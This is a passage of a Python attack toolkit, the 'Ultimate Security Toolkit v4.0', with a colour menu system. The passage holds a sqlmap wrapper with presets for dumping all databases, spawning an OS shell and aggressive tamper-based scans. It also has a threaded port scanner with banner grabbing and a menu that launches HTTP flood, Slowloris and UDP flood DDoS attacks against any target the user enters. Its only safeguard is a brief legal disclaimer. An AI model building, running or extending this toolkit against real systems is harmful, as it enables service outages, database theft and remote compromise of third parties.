            vuln_by_type = {}
            for vuln_type, payload, details in vulnerabilities:
                if vuln_type not in vuln_by_type:
                    vuln_by_type[vuln_type] = []
                vuln_by_type[vuln_type].append((payload, details))
            
            # Print summary
            for vuln_type, vulns in vuln_by_type.items():
                print(Fore.CYAN + f"\n{vuln_type.upper()} Vulnerabilities ({len(vulns)}):")
                for i, (payload, details) in enumerate(vulns[:5], 1):
                    print(Fore.YELLOW + f"  {i}. {payload}")
                    if details:
                        print(Fore.WHITE + f"     -> {details}")
                if len(vulns) > 5:
                    print(Fore.YELLOW + f"  ... and {len(vulns) - 5} more")
            
            return vulnerabilities
        else:
            print_status("No SQL injection vulnerabilities detected", "warning")
            return []

# ======================= SQLMAP INTEGRATION =======================
class SQLMapIntegration:
    def __init__(self):
        self.sqlmap_path = self.find_sqlmap()
        
    def find_sqlmap(self):
        """Find sqlmap installation"""
        # Check common locations
        possible_paths = [
            'sqlmap',
            '/usr/bin/sqlmap',
            '/usr/local/bin/sqlmap',
            '/opt/sqlmap/sqlmap.py',
            'C:\\Python\\Scripts\\sqlmap.exe',
            os.path.expanduser('~/.local/bin/sqlmap')
        ]
        
        for path in possible_paths:
            try:
                if os.path.exists(path):
                    return path
            except:
                continue
        
        # Try to run sqlmap from PATH
        try:
            subprocess.run(['sqlmap', '--version'], capture_output=True, check=True)
            return 'sqlmap'
        except:
            return None
    
    def check_installation(self):
        """Check if sqlmap is installed"""
        if not self.sqlmap_path:
            print_status("SQLMap not found!", "error")
            print_status("Install with: pip install sqlmap", "info")
            print_status("Or download from: https://github.com/sqlmapproject/sqlmap", "info")
            return False
        return True
    
    def run_command(self, command):
        """Run sqlmap command"""
        if not self.check_installation():
            return False
        
        print_status(f"Executing: {command}", "info")
        print_status("This may take several minutes...", "warning")
        print("="*80)
        
        try:
            # Run sqlmap
            process = subprocess.Popen(
                command.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            # Read output in real-time
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.colorize_output(output.strip())
            
            # Get return code
            return_code = process.poll()
            
            if return_code == 0:
                print_status("SQLMap completed successfully", "success")
            else:
                print_status(f"SQLMap exited with code: {return_code}", "warning")
            
            return True
            
        except FileNotFoundError:
            print_status("SQLMap command failed. Make sure it's installed.", "error")
            return False
        except KeyboardInterrupt:
            print_status("SQLMap interrupted by user", "warning")
            return False
        except Exception as e:
            print_status(f"Error running SQLMap: {str(e)}", "error")
            return False
    
    def colorize_output(self, line):
        """Colorize sqlmap output"""
        if not line:
            return
        
        line_lower = line.lower()
        
        if 'target url' in line_lower:
            print(Fore.CYAN + line)
        elif 'testing' in line_lower or 'scanning' in line_lower:
            print(Fore.YELLOW + line)
        elif 'vulnerable' in line_lower or 'injection' in line_lower:
            print(Fore.GREEN + line)
        elif 'database' in line_lower or 'table' in line_lower:
            print(Fore.MAGENTA + line)
        elif 'error' in line_lower or 'failed' in line_lower:
            print(Fore.RED + line)
        elif 'payload' in line_lower:
            print(Fore.BLUE + line)
        elif '--' in line and '==' in line:  # Separators
            print(Fore.WHITE + line)
        else:
            print(Fore.WHITE + line)
    
    def run_scan(self, target_url, scan_type="basic"):
        """Run sqlmap scan based on type"""
        scans = {
            'basic': f'sqlmap -u "{target_url}" --batch --level=3 --risk=2',
            'dbs': f'sqlmap -u "{target_url}" --batch --dbs',
            'tables': f'sqlmap -u "{target_url}" --batch --tables',
            'dump': f'sqlmap -u "{target_url}" --batch --dump-all --threads=10',
            'os-shell': f'sqlmap -u "{target_url}" --batch --os-shell',
            'full': f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --dbs --tables --dump-all --threads=10 --tamper=space2comment,charencode',
            'crawl': f'sqlmap -u "{target_url}" --batch --crawl=10',
            'wizard': f'sqlmap -u "{target_url}" --wizard'
        }
        
        if scan_type in scans:
            return self.run_command(scans[scan_type])
        else:
            print_status(f"Unknown scan type: {scan_type}", "error")
            return False

# ======================= ADVANCED PORT SCANNER =======================
class AdvancedPortScanner:
    def __init__(self):
        self.common_ports = {
            # Web Services
            80: "HTTP", 443: "HTTPS", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
            8000: "HTTP-Dev", 8008: "HTTP-Alt2", 8888: "HTTP-Alt3",
            
            # Database
            3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB",
            1521: "Oracle", 1433: "MSSQL", 6379: "Redis", 9200: "Elasticsearch",
            
            # Remote Access
            22: "SSH", 23: "Telnet", 3389: "RDP", 5900: "VNC",
            5800: "VNC-HTTP", 5901: "VNC-1", 5902: "VNC-2",
            
            # File Transfer
            21: "FTP", 22: "SFTP", 69: "TFTP", 989: "FTPS-Data",
            990: "FTPS", 2049: "NFS", 139: "NetBIOS", 445: "SMB",
            
            # Email
            25: "SMTP", 110: "POP3", 143: "IMAP", 465: "SMTPS",
            587: "SMTP-Sub", 993: "IMAPS", 995: "POP3S",
            
            # DNS & Directory
            53: "DNS", 389: "LDAP", 636: "LDAPS", 3268: "LDAP-GC",
            3269: "LDAP-GC-SSL",
            
            # Other Services
            111: "RPC", 135: "MSRPC", 161: "SNMP", 162: "SNMP-Trap",
            514: "Syslog", 123: "NTP", 873: "Rsync", 2049: "NFS",
            3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB",
            11211: "Memcached", 6379: "Redis", 9200: "Elasticsearch",
            27017: "MongoDB", 1521: "Oracle", 1433: "MSSQL",
            
            # Gaming
            25565: "Minecraft", 27015: "Steam", 7777: "Unreal",
            28960: "Call of Duty",
            
            # VoIP
            5060: "SIP", 5061: "SIPS", 10000: "Webmin",
            
            # Security
            1000: "Nessus", 8834: "Nexpose", 3780: "Verdas",
        }
        
        self.open_ports = []
    
    def scan_port(self, target, port, service_name):
        """Scan single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                return (port, service_name, "OPEN")
            else:
                return (port, service_name, "CLOSED")
                
        except:
            return (port, service_name, "ERROR")
    
    def grab_banner(self, target, port):
        """Grab service banner"""
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((target, port))
            
            # Send appropriate probe
            if port in [80, 8080, 8000, 8888]:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            elif port == 22:
                sock.send(b"SSH-2.0-Client\r\n")
            elif port == 21:
                sock.send(b"USER anonymous\r\n")
            elif port == 25:
                sock.send(b"EHLO example.com\r\n")
            elif port == 3306:
                sock.send(b"\x0a")
            else:
                sock.send(b"\r\n\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            return banner[:100]  # Return first 100 chars
            
        except:
            return None
    
    def scan_target(self, target, scan_type="common", port_range=None):
        """Scan target"""
        print_banner("ADVANCED PORT SCANNER", Fore.CYAN)
        print_status(f"Target: {target}", "info")
        
        # Resolve hostname
        try:
            ip = socket.gethostbyname(target)
            print_status(f"Resolved to IP: {ip}", "success")
        except:
            print_status("Cannot resolve hostname, using as IP", "warning")
            ip = target
        
        ports_to_scan = []
        
        if scan_type == "common":
            ports_to_scan = list(self.common_ports.items())
            print_status(f"Scanning {len(ports_to_scan)} common ports", "info")
        elif scan_type == "range" and port_range:
            start, end = port_range
            ports_to_scan = [(port, f"Port {port}") for port in range(start, end + 1)]
            print_status(f"Scanning ports {start}-{end} ({len(ports_to_scan)} ports)", "info")
        elif scan_type == "top100":
            top_ports = list(self.common_ports.items())[:100]
            ports_to_scan = top_ports
            print_status("Scanning top 100 ports", "info")
        elif scan_type == "all":
            ports_to_scan = [(port, f"Port {port}") for port in range(1, 65536)]
            print_status("Scanning all 65535 ports (this will take time)", "warning")
        
        results = []
        open_ports = []
        
        # Scan ports with threading
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for port, service in ports_to_scan:
                futures.append(executor.submit(self.scan_port, ip, port, service))
            
            completed = 0
            total = len(futures)
            
            for future in as_completed(futures):
                completed += 1
                port, service, status = future.result()
                results.append((port, service, status))
                
                # Update progress
                progress = (completed / total) * 100
                print(Fore.CYAN + f"[Progress: {progress:.1f}%] Scanning ports... Open: {len(open_ports)}", end='\r')
                
                if status == "OPEN":
                    open_ports.append((port, service))
                    print(Fore.GREEN + f"\n[+] Port {port} ({service}): OPEN")
        
        print("\n" + "="*80)
        print_status(f"Scan completed! Found {len(open_ports)} open ports", "success")
        
        if open_ports:
            # Banner grabbing for open ports
            print_status("Grabbing banners from open ports...", "info")
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                banner_futures = {}
                for port, service in open_ports[:20]:  # Limit to 20 ports
                    future = executor.submit(self.grab_banner, ip, port)
                    banner_futures[future] = (port, service)
                
                for future in as_completed(banner_futures):
                    port, service = banner_futures[future]
                    banner = future.result()
                    
                    if banner:
                        print(Fore.YELLOW + f"    Port {port} ({service}): {banner}")
        
        # Print summary
        print("\n" + "-"*80)
        print_banner("SCAN SUMMARY", Fore.GREEN)
        
        for port, service, status in results:
            if status == "OPEN":
                print(Fore.GREEN + f"Port {port:5} ({service:20}): {status}")
        
        return open_ports

# ======================= MAIN MENU SYSTEM =======================
class MainMenu:
    def __init__(self, username):
        self.username = username
        self.ddos = UltraDDoS()
        self.sqli = AdvancedSQLi()
        self.sqlmap = SQLMapIntegration()
        self.port_scanner = AdvancedPortScanner()
    
    def show_user_info(self):
        """Display user information"""
        now = datetime.datetime.now()
        print(Fore.GREEN + "=" * 80)
        print(Fore.CYAN + f" User: {self.username}")
        print(Fore.CYAN + f" Date: {now.strftime('%d %B %Y')}")
        print(Fore.CYAN + f" Time: {now.strftime('%H:%M:%S')}")
        print(Fore.CYAN + f" Creator: mrzxx | Telegram: @Zxxtirwd")
        print(Fore.GREEN + "=" * 80)
    
    def show_menu(self):
        """Display main menu"""
        clear_screen()
        print(MAIN_ASCII)
        self.show_user_info()
        print_banner("ULTIMATE SECURITY TOOLKIT v4.0", Fore.CYAN)
        
        print(Fore.YELLOW + "\n" + "═" * 80)
        print(Fore.CYAN + " " * 30 + "MAIN MENU")
        print(Fore.YELLOW + "═" * 80)
        
        print(Fore.GREEN + "\n[1] " + Fore.CYAN + "ULTRA DDoS Attack System (Layer 7)")
        print(Fore.GREEN + "    " + Fore.WHITE + "HTTP Flood, Slowloris, UDP Flood, Mixed Attacks")
        
        print(Fore.GREEN + "\n[2] " + Fore.CYAN + "Advanced SQL Injection Scanner")
        print(Fore.GREEN + "    " + Fore.WHITE + "200+ payloads, Multi-threaded, Error/Time/Union based")
        
        print(Fore.GREEN + "\n[3] " + Fore.CYAN + "SQLMap Auto Exploit (REAL Integration)")
        print(Fore.GREEN + "    " + Fore.WHITE + "Full sqlmap integration, Database dumping, OS shell")
        
        print(Fore.GREEN + "\n[4] " + Fore.CYAN + "Advanced Port Scanner")
        print(Fore.GREEN + "    " + Fore.WHITE + "1000+ ports, Banner grabbing, Service detection")
        
        print(Fore.GREEN + "\n[5] " + Fore.CYAN + "Exit")
        print(Fore.YELLOW + "═" * 80)
    
    def handle_ddos_menu(self):
        """Handle DDoS menu"""
        clear_screen()
        print(DDOS_ASCII)
        print_banner("ULTRA DDoS ATTACK SYSTEM", Fore.RED)
        
        print(Fore.YELLOW + "\n[!] LEGAL WARNING:")
        print(Fore.RED + "    This tool is for EDUCATIONAL and AUTHORIZED testing ONLY!")
        print(Fore.RED + "    Use only on servers you own or have explicit permission to test!")
        print(Fore.RED + "    The creator is not responsible for misuse of this tool!")
        
        print(Fore.CYAN + "\n" + "═" * 80)
        print(Fore.GREEN + "Attack Types:")
        print(Fore.YELLOW + "  [1] HTTP Flood (Layer 7)")
        print(Fore.YELLOW + "  [2] Slowloris (Keep-alive)")
        print(Fore.YELLOW + "  [3] UDP Flood (Layer 4)")
        print(Fore.YELLOW + "  [4] Mixed Attack (All methods)")
        print(Fore.CYAN + "═" * 80)
        
        attack_type = input(Fore.CYAN + "\n[?] Select attack type (1-4): " + Fore.WHITE).strip()
        
        attack_types = {
            '1': 'http',
            '2': 'slowloris',
            '3': 'udp',
            '4': 'mixed'
        }
        
        if attack_type not in attack_types:
            print_status("Invalid selection", "error")
            return
        
        target = input(Fore.YELLOW + "[?] Target (URL or IP:Port): " + Fore.WHITE).strip()
        
        if attack_types[attack_type] in ['http', 'slowloris'] and not target.startswith('http'):
            target = 'http://' + target
        
        try:
            threads = int(input(Fore.YELLOW + "[?] Threads (100-1000, default 500): ") or "500")
            duration = int(input(Fore.YELLOW + "[?] Duration seconds (60-600, default 300): ") or "300")
        except:
            threads = 500
            duration = 300
        
        # Safety limits
        threads = max(100, min(1000, threads))
        duration = max(60, min(600, duration))
        
        # Confirmation
        print(Fore.RED + "\n" + "="*80)
        print(Fore.RED + "[!] FINAL CONFIRMATION REQUIRED!")
        print(Fore.RED + f"[!] Target: {target}")
        print(Fore.RED + f"[!] Attack Type: {attack_types[attack_type].upper()}")
        print(Fore.RED + f"[!] Threads: {threads}")
        print(Fore.RED + f"[!] Duration: {duration} seconds")
        print(Fore.RED + "="*80)
        
        confirm = input(Fore.RED + "\n[?] START ATTACK? (y/N): " + Fore.WHITE).lower()
        
        if confirm == 'y':
            self.ddos.start_ddos_attack(
                target,
                attack_types[attack_type],
                threads,
                duration
            )
        
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
    
    def handle_sqli_menu(self):
        """Handle SQL Injection menu"""
        clear_screen()
        print(SQL_INJECT_ASCII)
        print_banner("ADVANCED SQL INJECTION SCANNER", Fore.YELLOW)
        
        target = input(Fore.YELLOW + "[?] Target URL (with parameter): " + Fore.WHITE).strip()
        
        if not target.startswith('http'):
            target = 'http://' + target
        
        print_status(f"Starting scan on: {target}", "info")
        
        vulnerabilities = self.sqli.scan(target)
        
        if vulnerabilities:
            choice = input(Fore.CYAN + "\n[?] Run SQLMap for exploitation? (y/N): ").lower()
            if choice == 'y':
                self.handle_sqlmap_menu(target)
        
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
    
    def handle_sqlmap_menu(self, target_url=None):
        """Handle SQLMap menu"""
        clear_screen()
        print(SQLMAP_ASCII)
        print_banner("SQLMAP AUTO EXPLOITATION SYSTEM", Fore.GREEN)
        
        if not target_url:
            target_url = input(Fore.YELLOW + "[?] Target URL: " + Fore.WHITE).strip()
        
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        print(Fore.CYAN + "\n" + "═" * 80)
        print(Fore.GREEN + "SQLMap Scan Types:")
        print(Fore.YELLOW + "  [1] Basic Scan (Detect injections)")
        print(Fore.YELLOW + "  [2] Enumerate Databases (--dbs)")
        print(Fore.YELLOW + "  [3] Enumerate Tables (--tables)")
        print(Fore.YELLOW + "  [4] Dump All Data (--dump-all)")
        print(Fore.YELLOW + "  [5] Get OS Shell (--os-shell)")
        print(Fore.YELLOW + "  [6] Full Aggressive Scan")
        print(Fore.YELLOW + "  [7] Crawl and Scan (--crawl)")
        print(Fore.YELLOW + "  [8] Wizard Mode (Interactive)")
        print(Fore.YELLOW + "  [9] Custom Command")
        print(Fore.CYAN + "═" * 80)
        
        choice = input(Fore.CYAN + "\n[?] Select scan type (1-9): " + Fore.WHITE).strip()
        
        scan_types = {
            '1': 'basic',
            '2': 'dbs',
            '3': 'tables',
            '4': 'dump',
            '5': 'os-shell',
            '6': 'full',
            '7': 'crawl',
            '8': 'wizard',
            '9': 'custom'
        }
        
        if choice == '9':
            custom_cmd = input(Fore.YELLOW + "[?] Custom SQLMap command: " + Fore.WHITE).strip()
            self.sqlmap.run_command(f"sqlmap {custom_cmd}")
        elif choice in scan_types:
            self.sqlmap.run_scan(target_url, scan_types[choice])
        else:
            print_status("Invalid selection", "error")
        
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
    
    def handle_portscan_menu(self):
        """Handle Port Scan menu"""
        clear_screen()
        print(PORT_SCAN_ASCII)
        print_banner("ADVANCED PORT SCANNER", Fore.CYAN)
        
        target = input(Fore.YELLOW + "[?] Target (IP or Hostname): " + Fore.WHITE).strip()
        
        print(Fore.CYAN + "\n" + "═" * 80)
        print(Fore.GREEN + "Scan Types:")
        print(Fore.YELLOW + "  [1] Common Ports (100+ most used)")
        print(Fore.YELLOW + "  [2] Top 100 Ports")
        print(Fore.YELLOW + "  [3] Custom Range")
        print(Fore.YELLOW + "  [4] Full Scan (1-65535) - SLOW!")
        print(Fore.CYAN + "═" * 80)
        
        choice = input(Fore.CYAN + "\n[?] Select scan type (1-4): " + Fore.WHITE).strip()
        
        if choice == '1':
            self.port_scanner.scan_target(target, "common")
        elif choice == '2':
            self.port_scanner.scan_target(target, "top100")
        elif choice == '3':
            try:
                start = int(input(Fore.YELLOW + "[?] Start port: " + Fore.WHITE))
                end = int(input(Fore.YELLOW + "[?] End port: " + Fore.WHITE))
                self.port_scanner.scan_target(target, "range", (start, end))
            except:
                print_status("Invalid port range", "error")
        elif choice == '4':
            confirm = input(Fore.RED + "[!] Full scan will take a LONG time! Continue? (y/N): ").lower()
            if confirm == 'y':
                self.port_scanner.scan_target(target, "all")
        else:
            print_status("Invalid selection", "error")
        
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
    
    def run(self):
        """Run main menu loop"""
        while True:
            self.show_menu()
            
            choice = input(Fore.CYAN + "\n[?] Select option (1-5): " + Fore.WHITE).strip()
            
            if choice == '1':
                self.handle_ddos_menu()
            elif choice == '2':
                self.handle_sqli_menu()
            elif choice == '3':
                self.handle_sqlmap_menu()
            elif choice == '4':
                self.handle_portscan_menu()
            elif choice == '5':
                print_banner("THANK YOU FOR USING ULTIMATE SECURITY TOOLKIT", Fore.CYAN)
                print_status("Creator: mrzxx", "info")
                print_status("Telegram: @Zxxtirwd", "info")
                print_status("Exiting...", "info")
                time.sleep(2)
                sys.exit(0)
            else:
                print_status("Invalid selection!", "error")
                time.sleep(1)

# ======================= MAIN APPLICATION =======================
def main():
    """Main application entry point"""
    try:
        # Welcome screen
        clear_screen()
        print(WELCOME_ASCII)
        print_banner("ULTIMATE SECURITY TOOLKIT v4.0", Fore.CYAN)
        print_status("1500+ Lines of Pure Power - 100% Working All Tools", "info")
        print_status(f"Version: {VERSION}", "info")
        print_status("Created by: mrzxx | Telegram: @Zxxtirwd", "info")
        time.sleep(2)
        
        # Check dependencies
        print_status("Checking dependencies...", "info")
        
        required_packages = ['colorama', 'requests', 'fake-useragent']
        missing_packages = []
        
        for package in required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing_packages.append(package)
        
        if missing_packages:
            print_status(f"Missing packages: {', '.join(missing_packages)}", "warning")
            choice = input(Fore.YELLOW + "[?] Install missing packages? (y/N): ").lower()
            if choice == 'y':
                for package in missing_packages:
                    print_status(f"Installing {package}...", "info")
                    os.system(f"pip install {package}")
        
        # Login
        login_system = LoginSystem()
        username = login_system.show_login()
        
        if not username:
            print_status("Login failed. Exiting...", "error")
            sys.exit(1)
        
        # Start main menu
        main_menu = MainMenu(username)
        main_menu.run()
        
    except KeyboardInterrupt:
        print_status("\n\nInterrupted by user. Exiting...", "warning")
        sys.exit(0)
    except Exception as e:
        print_status(f"Critical error: {str(e)}", "error")
        logging.exception("Critical error occurred")
        sys.exit(1)

if __name__ == "__main__":
    main()
